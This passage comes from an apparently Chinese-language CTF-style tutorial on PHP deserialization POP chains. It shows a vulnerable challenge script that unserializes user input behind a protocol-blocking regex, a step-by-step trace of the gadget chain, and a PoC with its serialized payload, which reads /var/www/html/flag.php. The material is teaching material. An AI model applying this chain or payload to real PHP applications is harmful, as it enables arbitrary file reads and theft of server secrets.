<span class="line"><span style="color:#E1E4E8;">$name</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">unserialize</span><span style="color:#E1E4E8;">($_GET[</span><span style="color:#9ECBFF;">&#39;strs&#39;</span><span style="color:#E1E4E8;">]);</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Output</span><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $test;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $str;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__construct</span><span style="color:#24292E;">($name){</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">str </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> $name;</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__destruct</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">test </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">str;</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">test;</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Show</span><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $source;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $str;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__construct</span><span style="color:#24292E;">($file){</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">source </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> $file;</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">source;</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__toString</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">        $content </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">str[</span><span style="color:#032F62;">&#39;str&#39;</span><span style="color:#24292E;">]</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">source;</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> $content;</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__set</span><span style="color:#24292E;">($key,$value){</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">$key </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> $value;</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">_show</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">if</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">preg_match</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;/http|https|file:|gopher|dict|</span><span style="color:#22863A;font-weight:bold;">\\.\\.</span><span style="color:#032F62;">|f1ag/i&#39;</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">source)){</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">die</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;hacker!&#39;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">        } </span><span style="color:#D73A49;">else</span><span style="color:#24292E;"> {</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#005CC5;">highlight_file</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">source);</span></span>
<span class="line"><span style="color:#24292E;">        }</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__wakeup</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">if</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">preg_match</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;/http|https|file:|gopher|dict|</span><span style="color:#22863A;font-weight:bold;">\\.\\.</span><span style="color:#032F62;">/i&quot;</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">source)){</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;hacker~&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">source </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;index.php&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">        }</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Test</span><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $file;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $params;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__construct</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">params </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">array</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__get</span><span style="color:#24292E;">($key){</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#6F42C1;">get</span><span style="color:#24292E;">($key);</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">get</span><span style="color:#24292E;">($key){</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">if</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">isset</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">params[$key])){</span></span>
<span class="line"><span style="color:#24292E;">            $value </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">params[$key];</span></span>
<span class="line"><span style="color:#24292E;">        } </span><span style="color:#D73A49;">else</span><span style="color:#24292E;"> {</span></span>
<span class="line"><span style="color:#24292E;">            $value </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;index.php&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">        }</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#6F42C1;">file_get</span><span style="color:#24292E;">($value);</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">file_get</span><span style="color:#24292E;">($value){</span></span>
<span class="line"><span style="color:#24292E;">        $text </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">base64_encode</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">file_get_contents</span><span style="color:#24292E;">($value));</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> $text;</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#005CC5;">show_source</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">__FILE__</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">$name</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">unserialize</span><span style="color:#24292E;">($_GET[</span><span style="color:#032F62;">&#39;strs&#39;</span><span style="color:#24292E;">]);</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>按照前面介绍的利用思路，一步步来套用上。</p><p><strong>1. 寻找原程序中可利用的目标方法，比如包含 system、eval、exec 等危险函数的地方。</strong></p><p>在题目中，没有找到上面用于执行代码或命令的函数，但是在 Test::file_get() 调用 file_get_contents 读取文件内容，如果能够利用它实现任意文件读取也是可取的，因此就以 Test 类方法 file_get 为目标方法；</p><p><strong>2. 追踪调用第 1 步中方法的其他类方法/函数。</strong></p><p>看哪里调用 Test::file_get()，可以看到是 Test::get()，再往上追踪，发现是在 Test::__get() 调用的，这个 __get() 魔术方法的触发条件是：读取不可访问属性值，包括私有或未定义属性。在 Show::__toString() 中就有对未定义属性 $content 的操作，这样就会触发 __get() 方法。再往上追溯，发现 Output::__destruct() 中调用到 echo 函数可触发 __toString() ，这样就得到整个调用链如下：</p>`,14),i=s("p",null,"图 2 调用链",-1),F=s("p",null,[s("strong",null,"3. 寻找可控制第 1 步方法的参数的其他类方法函数。")],-1),u=s("p",null,"这里需要控制的是 file_get_contents($value) 中的参数 $value，依次往上追溯，发现其来自数组中的一个元素值，得到如下传播路径：",-1),h=s("p",null,"图 3 参数传播路径",-1),C=s("p",null,"为了对应 Show::__toString() 中的 $this->str['str']->source ，我们可以通过array('source'=>'可控内容') 来控制 $value，即打算读取的文件路径。进一步优化下传播路径：",-1),d=l(`<p>图 4 优化后的参数传播路径</p><p><strong>4. 编写 poc，构建恶意类对象，然后调用 serialize 函数去生成序列化字符串。</strong></p><p>根据图 2 的调用链可以知道，起始的调用类在 Output，因此我们需要反序列化它。</p><p>基于前面的分析，PoC 代码如下：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Output</span><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $test;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $str;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__construct</span><span style="color:#E1E4E8;">($name){</span></span>
<span class="line"><span style="color:#E1E4E8;">          </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">str </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> $name;</span></span>
<span class="line"><span style="color:#E1E4E8;">      }</span></span>
<span class="line"><span style="color:#E1E4E8;">      </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__destruct</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">          </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">test </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">str;</span></span>
<span class="line"><span style="color:#E1E4E8;">          </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">test;</span></span>
<span class="line"><span style="color:#E1E4E8;">      }</span></span>
<span class="line"><span style="color:#E1E4E8;">  }</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Show</span><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $str;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $source;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__toString</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">          $content </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">str[</span><span style="color:#9ECBFF;">&#39;str&#39;</span><span style="color:#E1E4E8;">]</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">source;</span></span>
<span class="line"><span style="color:#E1E4E8;">          </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> (</span><span style="color:#F97583;">string</span><span style="color:#E1E4E8;">)$content;</span></span>
<span class="line"><span style="color:#E1E4E8;">      }</span></span>
<span class="line"><span style="color:#E1E4E8;">  }</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Test</span><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $file;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $params;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 原方法的定义此处省略，因为它对生成序列化字符串没有影响</span></span>
<span class="line"><span style="color:#E1E4E8;">  }</span></span>
<span class="line"><span style="color:#E1E4E8;">  $test </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">Test</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">  $test</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">params </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">array</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;source&#39;</span><span style="color:#F97583;">=&gt;</span><span style="color:#9ECBFF;">&#39;/var/www/html/flag.php&#39;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">  $show </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">Show</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">  $show</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">str </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">array</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;str&#39;</span><span style="color:#F97583;">=&gt;</span><span style="color:#E1E4E8;">$test);</span></span>
<span class="line"><span style="color:#E1E4E8;">  $output </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">Output</span><span style="color:#E1E4E8;">($show);</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">serialize</span><span style="color:#E1E4E8;">($output);</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Output</span><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $test;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $str;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__construct</span><span style="color:#24292E;">($name){</span></span>
<span class="line"><span style="color:#24292E;">          </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">str </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> $name;</span></span>
<span class="line"><span style="color:#24292E;">      }</span></span>
<span class="line"><span style="color:#24292E;">      </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__destruct</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">          </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">test </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">str;</span></span>
<span class="line"><span style="color:#24292E;">          </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">test;</span></span>
<span class="line"><span style="color:#24292E;">      }</span></span>
<span class="line"><span style="color:#24292E;">  }</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Show</span><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $str;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $source;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__toString</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">          $content </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">str[</span><span style="color:#032F62;">&#39;str&#39;</span><span style="color:#24292E;">]</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">source;</span></span>
<span class="line"><span style="color:#24292E;">          </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> (</span><span style="color:#D73A49;">string</span><span style="color:#24292E;">)$content;</span></span>
<span class="line"><span style="color:#24292E;">      }</span></span>
<span class="line"><span style="color:#24292E;">  }</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Test</span><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $file;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $params;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 原方法的定义此处省略，因为它对生成序列化字符串没有影响</span></span>
<span class="line"><span style="color:#24292E;">  }</span></span>
<span class="line"><span style="color:#24292E;">  $test </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">Test</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">  $test</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">params </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">array</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;source&#39;</span><span style="color:#D73A49;">=&gt;</span><span style="color:#032F62;">&#39;/var/www/html/flag.php&#39;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">  $show </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">Show</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">  $show</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">str </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">array</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;str&#39;</span><span style="color:#D73A49;">=&gt;</span><span style="color:#24292E;">$test);</span></span>
<span class="line"><span style="color:#24292E;">  $output </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">Output</span><span style="color:#24292E;">($show);</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">serialize</span><span style="color:#24292E;">($output);</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>执行后得到如下序列化字符串：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">O</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">6</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;Output&quot;</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">2</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">{s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">4</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;test&quot;</span><span style="color:#E1E4E8;">;N;s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">3</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;str&quot;</span><span style="color:#E1E4E8;">;O</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">4</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;Show&quot;</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">2</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">{s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">3</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;str&quot;</span><span style="color:#E1E4E8;">;a</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">1</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">{s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">3</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;str&quot;</span><span style="color:#E1E4E8;">;O</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">4</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;Test&quot;</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">2</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">{s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">4</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;file&quot;</span><span style="color:#E1E4E8;">;N;s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">6</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;params&quot;</span><span style="color:#E1E4E8;">;a</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">1</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">{s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">6</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;source&quot;</span><span style="color:#E1E4E8;">;s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">22</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;/var/www/html/flag.php&quot;</span><span style="color:#E1E4E8;">;}}}s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">6</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;source&quot;</span><span style="color:#E1E4E8;">;N;}}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">O</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">6</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;Output&quot;</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">2</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">{s</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">4</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;test&quot;</span><span style="color:#24292E;">;N;s</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">3</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;str&quot;</span><span style="color:#24292E;">;O</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">4</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;Show&quot;</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">2</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">{s</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">3</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;str&quot;</span><span style="color:#24292E;">;a</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">1</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">{s</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">3</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;str&quot;</span><span style="color:#24292E;">;O</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">4</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;Test&quot;</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">2</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">{s</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">4</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;file&quot;</span><span style="color:#24292E;">;N;s</span><span style="color:#D73A49;">:</span><span 